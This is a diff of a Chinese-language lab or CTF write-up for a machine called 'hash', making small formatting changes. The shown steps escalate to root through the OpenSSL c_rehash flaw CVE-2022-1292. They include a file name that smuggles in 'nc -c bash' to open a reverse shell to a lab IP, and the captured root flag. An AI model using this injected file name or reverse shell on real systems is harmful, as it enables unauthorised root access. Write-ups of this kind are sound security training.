@@ -217,16 +217,16 @@ User maria may run the following commands on hash:
 参考：[alcaparra/CVE-2022-1292: CVE-2022-1292 OpenSSL c_rehash Vulnerability - POC](https://github.com/alcaparra/CVE-2022-1292)
 
 ```shell
-(remote) maria@hash:/home/maria$ nano 
+(remote) maria@hash:/home/maria$ nano
 ```
 
-然后在`nano`编辑器中输入
+然后在 `nano` 编辑器中输入
 
 ```plaintext
 -----BEGIN CERTIFICATE-----
 ```
 
-然后`Ctrl`+`x`，保存文件，使用以下作为文件名
+然后 `Ctrl`+`x`，保存文件，使用以下作为文件名
 
 ```plaintext
 hey.crt`nc -c bash 192.168.56.102 6666
@@ -254,6 +254,6 @@ root
 ### flag - root
 
 ```shell
-(remote) root@hash:/root# cat root.txt 
+(remote) root@hash:/root# cat root.txt
 hashhater
 ```
